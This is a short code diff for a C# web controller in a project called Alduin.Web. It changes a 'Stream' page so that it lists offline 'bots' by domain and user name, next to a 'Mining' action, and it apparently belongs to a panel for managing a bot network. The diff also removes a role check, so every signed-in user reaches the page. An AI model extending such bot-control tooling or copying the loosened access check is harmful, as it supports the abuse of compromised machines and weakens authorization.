@@ -39,17 +39,20 @@ namespace Alduin.Web.Controllers
             
         }
         [Authorize]
-        public IActionResult Stream()
+        public async Task<IActionResult> Stream()
         {
-            if (User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value != "User")
+            var bots = new GetBotsByStatusQuery
             {
-                return View();
-            }
-            else
+                status = false //offline
+            };
+            var botlist = await _mediator.Send(bots);
+            var model = new StreamModel();
+            for (int i = 0; i < botlist.Length; i++)
             {
-                return RedirectToAction(nameof(HomeController.Index), "Home");
+                model.NewVariables[i].Domain = botlist[i].Domain;
+                model.NewVariables[i].Name = botlist[i].UserName;
             }
-
+            return View(model);
         }
         [Authorize]
         public IActionResult Mining()
